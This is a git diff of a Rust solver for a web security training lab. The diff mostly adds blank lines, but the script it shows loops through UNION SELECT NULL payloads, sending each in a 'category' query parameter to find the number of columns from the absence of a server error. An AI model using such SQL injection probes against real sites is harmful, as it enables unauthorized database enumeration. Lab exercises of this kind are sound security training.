@@ -38,6 +38,7 @@ use text_colorizer::Colorize;
 fn main() {
     // change this to your lab URL
     let url = "https://0ad600620424ed3981b7ed6c00f40071.web-security-academy.net";
+
     // build the client that will be used for all subsequent requests
     let client = build_client();
 
@@ -47,12 +48,16 @@ fn main() {
         "category".yellow()
     );
     io::stdout().flush();
+
     for i in 1..10 {
         // number of nulls
         let nulls = "null, ".repeat(i);
+
         // payload to retreive the number of columns
         let payload = format!("' UNION SELECT {nulls}-- -").replace(", -- -", "-- -"); // replace the last coma to make the syntax valid
+
         println!("[*] Trying payload: {}", payload);
+
         // fetch the page with the injected payload
         let null_injection = client
             .get(format!("{url}/filter?category={payload}"))
@@ -62,10 +67,13 @@ fn main() {
                 "[!] Failed to fetch the page with the injected payload to determine the number of columns"
                     .red()
             ));
-        // body of the response
+
+        // get the body of the response
         let body = null_injection.text().unwrap();
+
         // extract error text to determine if the payload is valid or not
         let internal_error = extract_pattern("<h4>Internal Server Error</h4>", &body);
+
         // if the error text doesn't exist
         if internal_error.is_none() {
             println!(
@@ -73,11 +81,13 @@ fn main() {
                 "Number of columns: ".white(),
                 i.to_string().green().bold()
             );
+
             break;
         } else {
             continue;
         }
     }
+
     println!(
         "{} {}",
         "🗹 Check your browser, it should be marked now as"
